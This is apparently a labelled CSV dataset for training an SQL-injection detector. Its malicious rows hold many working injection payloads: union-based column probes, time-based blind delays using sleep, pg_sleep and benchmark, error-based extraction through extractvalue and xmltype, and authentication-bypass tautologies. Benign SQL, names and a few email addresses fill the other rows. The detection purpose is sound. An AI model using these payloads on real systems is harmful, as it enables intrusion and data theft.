Sentence,Label,Processed_Sentence
"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""ikhr""  =  ""ikhr",1.0,"0"" procedure analyse  (  extractvalue  (  0,concat  (  0x0c,  (  benchmark  (  0,md0  (  0x0a0   )    )      )    )     )  ,0  )   and ""ikhr""  =  ""ikhr"
SELECT * FROM origin 3,0.0,select * from origin 0
marciniu,0.0,marciniu
"1' where 3339  =  3339 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1.0,"0' where 0  =  0 and 0  =  benchmark  (  0,md0  (  0x0   )    )   --"
"1"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1.0,"0"" procedure analyse  (  extractvalue  (  0,concat  (  0x0c,  (  benchmark  (  0,md0  (  0x0b0c0   )    )      )    )     )  ,0  )  #"
 UPDATE rubber SET instead = 'brain'WHERE spite = 'coach',0.0, update rubber set instead = 'brain'where spite = 'coach'
SELECT * FROM down 3,0.0,select * from down 0
"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1.0,"0%"" and 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  --"
SELECT * FROM  ( SELECT care FROM yesterday ) ,0.0,select * from  ( select care from yesterday ) 
"1',  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  ",1.0,"0',  (  select   (  case when   (  0  =  0  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null   )    )     )   else 0/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  "
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1.0," select * from users where id  =  0 *0 union select null,banner from v$version where rownum  =  0 -- 0"
"1'   )    )     )   union all select null,null,null,null,null,null--",1.0,"0'   )    )     )   union all select null,null,null,null,null,null--"
"1""  )   as tecq where 4817  =  4817 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1.0,"0""  )   as tecq where 0  =  0 and 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  --"
1'   )    )    as qaki where 5272  =  5272,1.0,0'   )    )    as qaki where 0  =  0
SELECT change ( s )  FROM chicken UNION ALL,0.0,select change ( s )  from chicken union all
SELECT * FROM yard FETCH FIRST 3 ROWS ONLY,0.0,select * from yard fetch first 0 rows only
"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",1.0,"0""   )    )    and 0  =  0 and    (    (   ""zuhv""  =  ""zuhv"
"   SELECT Employees.affect, COUNT ( Orders.coldID )  AS jarFROM    ( OrdersINNER JOIN amount ON Orders.symbolID  =  Employees.silkID ) ",0.0,"   select employees.affect, count ( orders.coldid )  as jarfrom    ( ordersinner join amount on orders.symbolid  =  employees.silkid ) "
"-5581%'   )    )     )   union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",1.0,"-0%'   )    )     )   union all select 0,0,0,0,0,0,0,0,0,0#"
"1' where 7504  =  7504 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1.0,"0' where 0  =  0 and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )  --"
1'+  (  select oljg where 2006  =  2006 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   +',1.0,0'+  (  select oljg where 0  =  0 and 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual   )    )   +'
kaunas,0.0,kaunas
1'||  (  select 'feki' where 4082  =  4082 and   (  3587  =  4207  )  *4207  )  ||',1.0,0'||  (  select 'feki' where 0  =  0 and   (  0  =  0  )  *0  )  ||'
1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',1.0,0'+  (  select ejaj where 0  =  0 or 0  =    (  select 0 from pg_sleep  (  0   )    )     )  +'
"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'gbpg'  =  'gbpg",1.0,"0' procedure analyse  (  extractvalue  (  0,concat  (  0x0c,  (  benchmark  (  0,md0  (  0x0a0   )    )      )    )     )  ,0  )   and 'gbpg'  =  'gbpg"
"  UPDATE sale SET jar =  'shorter', City =  'chain' WHERE occur =  ordinary",0.0,"  update sale set jar =  'shorter', city =  'chain' where occur =  ordinary"
"-7514%""   )    )     )   or 2448  =  8797#",1.0,"-0%""   )    )     )   or 0  =  0#"
"-9736' or make_set  (  7311  =  2067,2067  )   and 'czdt' like 'czdt",1.0,"-0' or make_set  (  0  =  0,0  )   and 'czdt' like 'czdt"
"1%'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1.0,"0%'   )    )    and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )  --"
SELECT worried ( s )  FROM essential LEFT JOIN,0.0,select worried ( s )  from essential left join
tromba,0.0,tromba
"1%""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""%""  =  """,1.0,"0%""   )    )     )   rlike   (  select   (  case when   (  0  =  0  )   then 0 else 0x0 end   )    )    and    (    (     (  ""%""  =  """
SELECT TOP 50 PERCENT * FROM no,0.0,select top 0 percent * from no
SELECT COUNT ( fierceID ) FROM safety,0.0,select count ( fierceid ) from safety
prado de la guzpea,0.0,prado de la guzpea
"   SELECT jet, city+ ', ' + soil+ ' ' + growth+ ', ' + entire AS wrote  FROM play",0.0,"   select jet, city+ ', ' + soil+ ' ' + growth+ ', ' + entire as wrote  from play"
"  SELECT Orders.pigrID, Employees.shirt, Employees.already FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.hornID ORDER BY Orders.goldID",0.0,"  select orders.pigrid, employees.shirt, employees.already from ordersright join employees on orders.employeeid  =  employees.hornid order by orders.goldid"
25254382z,0.0,0z
SELECT * FROM fewer ORDER BY suddenly,0.0,select * from fewer order by suddenly
"-8382""   )    )    order by 1--",1.0,"-0""   )    )    order by 0--"
ezequas,0.0,ezequas
ivon,0.0,ivon
"1""  )   as semi where 4260  =  4260",1.0,"0""  )   as semi where 0  =  0"
"1   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5349  =  5349",1.0,"0   )    )    and   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   0  =  0"
lyston@classroommanager.co,0.0,lyston@classroommanager.co
1'  )   as pudv where 2609  =  2609,1.0,0'  )   as pudv where 0  =  0
"   SELECT COUNT ( report ) , throat FROM task BY speech",0.0,"   select count ( report ) , throat from task by speech"
" select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",1.0," select * from users where id  =  0 union select 0`\`,version  (    )   -- 0"
parolero,0.0,parolero
"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",1.0,"0'   )    )    and 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )   and    (    (   'miba'  =  'miba"
/**/or/**/1/**/  =  /**/1,1.0,/**/or/**/0/**/  =  /**/0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""pdqm"" like ""pdqm",1.0,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )   and   (  ""pdqm"" like ""pdqm"
SELECT TOP 3 * FROM lying WHERE straw = 'decide',0.0,select top 0 * from lying where straw = 'decide'
"INSERT INTO skill  ( lunch, entire, basket )  VALUES  ( 'scientist', 'government', 'worried' )  ",0.0,"insert into skill  ( lunch, entire, basket )  values  ( 'scientist', 'government', 'worried' )  "
"calle maria marin, 196,",0.0,"calle maria marin, 0,"
"-2434'   )    )     )   union all select 5509,5509,5509,5509,5509,5509,5509--",1.0,"-0'   )    )     )   union all select 0,0,0,0,0,0,0--"
claudine,0.0,claudine
reiji,0.0,reiji
SELECT AVG ( strange ) FROM excited,0.0,select avg ( strange ) from excited
"admin"" or 1  =  1#",1.0,"admin"" or 0  =  0#"
aizpuru cerusoli,0.0,aizpuru cerusoli
5r32n7,0.0,0r0n0
recomendaci$n,0.0,recomendaci$n
09899393d,0.0,0d
19784273h,0.0,0h
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,1.0,0'  )   or 0  =    (  select 0 from pg_sleep  (  0   )    ) 
select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,1.0,select pg_sleep  (  0  )   and    (    (   'enpn' like 'enpn
"-4015"" where 2610  =  2610 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1.0,"-0"" where 0  =  0 or 0 group by concat  (  0x0a0,  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )    having min  (  0  )  #"
c1236ometimi8nto,0.0,c0ometimi0nto
"1%'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  '%'  =  '",1.0,"0%'  )   procedure analyse  (  extractvalue  (  0,concat  (  0x0c,  (  benchmark  (  0,md0  (  0x0a0   )    )      )    )     )  ,0  )   and   (  '%'  =  '"
-2869'   )    )    union all select 3216--,1.0,-0'   )    )    union all select 0--
SELECT COUNT ( divideID ) FROM asleep,0.0,select count ( divideid ) from asleep
-8071   )    )    or 9160  =  4253,1.0,-0   )    )    or 0  =  0
"  SELECT SUBSTRING_INDEX ( ""www.w3schools.com"", ""."", 2 ) ;",0.0,"  select substring_index ( ""www.w0schools.com"", ""."", 0 ) ;"
1   )    )    rlike   (  select   (  case when   (  6113  =  1222  )   then 1 else 0x28 end   )    )    and    (    (   2815  =  2815,1.0,0   )    )    rlike   (  select   (  case when   (  0  =  0  )   then 0 else 0x0 end   )    )    and    (    (   0  =  0
SELECT * FROM chair WHERE count = 'general' LIMIT 3,0.0,select * from chair where count = 'general' limit 0
pataki-grifties@hiteurope.by,0.0,pataki-grifties@hiteurope.by
1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --,1.0,0  )   as eryo where 0  =  0 rlike sleep  (  0  )  --
"1',  (  select   (  case when   (  3576  =  7744  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1.0,"0',  (  select   (  case when   (  0  =  0  )   then 0 else cast  (  0 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  "
polanco,0.0,polanco
SELECT TOP 50 PERCENT * FROM to SELECT * FROM cook FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM surrounded,0.0,select top 0 percent * from to select * from cook fetch first 0 percent rows onlyselect top 0 * from surrounded
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1.0,"0""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  0   )    )     )  vwyq  )  #"
SELECT COUNT ( motion )  FROM topic,0.0,select count ( motion )  from topic
"1  )   where 2741  =  2741 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1.0,"0  )   where 0  =  0 and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )  --"
"-9672'   )    )    as rupb where 8218  =  8218 or make_set  (  4954  =  1836,1836  )  --",1.0,"-0'   )    )    as rupb where 0  =  0 or make_set  (  0  =  0,0  )  --"
SELECT TOP 50 PERCENT * FROM settle SELECT * FROM blank FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM somehow,0.0,select top 0 percent * from settle select * from blank fetch first 0 percent rows onlyselect top 0 * from somehow
1%'   )    )     )   rlike   (  select   (  case when   (  7697  =  3334  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',1.0,0%'   )    )     )   rlike   (  select   (  case when   (  0  =  0  )   then 0 else 0x0 end   )    )    and    (    (     (  '%'  =  '
basile@europop.by,0.0,basile@europop.by
limpi$aas,0.0,limpi$aas
ergasto,0.0,ergasto
SELECT * FROM thee WHERE feet = 'cabin' FETCH FIRST 3 ROWS ONLY,0.0,select * from thee where feet = 'cabin' fetch first 0 rows only
"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",1.0,"-0""  )   as jzvq where 0  =  0 union all select 0,0,0#"
"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",1.0,"0%'  )   and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )   and   (  '%'  =  '"
nardi borgua,0.0,nardi borgua
SELECT * FROM birth ORDER BY plural,0.0,select * from birth order by plural
 or 3  =  3,1.0, or 0  =  0
rosset,0.0,rosset
mira boncompte,0.0,mira boncompte
"1' in boolean mode  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1.0,"0' in boolean mode  )   or 0  =  benchmark  (  0,md0  (  0x0d0a0c   )    )   #"
SELECT TOP 3 * FROM lips WHERE walk = 'fence',0.0,select top 0 * from lips where walk = 'fence'
SELECT COUNT ( womenID ) FROM merely,0.0,select count ( womenid ) from merely
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # couj",1.0,"0 and   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )  # couj"
"-5198   )    )     )   union all select 7089,7089,7089,7089,7089,7089,7089,7089#",1.0,"-0   )    )     )   union all select 0,0,0,0,0,0,0,0#"
soeltoft@nanogenerador.pr,0.0,soeltoft@nanogenerador.pr
"   SELECT Employees.regular, COUNT ( Orders.mountainID )  AS flagFROM    ( OrdersINNER JOIN lips ON Orders.gladID  =  Employees.plusID ) ",0.0,"   select employees.regular, count ( orders.mountainid )  as flagfrom    ( ordersinner join lips on orders.gladid  =  employees.plusid ) "
blanquer,0.0,blanquer
SELECT COUNT ( regular ) FROM clean,0.0,select count ( regular ) from clean
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,1.0,0 and   (  select * from   (  select  (  sleep  (  0   )    )     )  fzno  ) 
SELECT * FROM machinery WHERE wooden = 'completely'  OR sides = 'talk',0.0,select * from machinery where wooden = 'completely'  or sides = 'talk'
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'ylit' like 'ylit",1.0,"0'  )    (  select   (  case when   (  0  =  0  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )   else char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )   end  )   from   (  values  (  0   )    )     )   and   (  'ylit' like 'ylit"
SELECT * FROM older WHERE NOT regular = 'lead'  AND NOT clearly = 'straw',0.0,select * from older where not regular = 'lead'  and not clearly = 'straw'
SELECT * FROM certain FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM system,0.0,select * from certain fetch first 0 rows only select top 0 percent * from system
"1%""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0%""  )   and 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
-1985   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  1248  =  1248,1.0,-0   )    )     )   or 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual  )   and    (    (     (  0  =  0
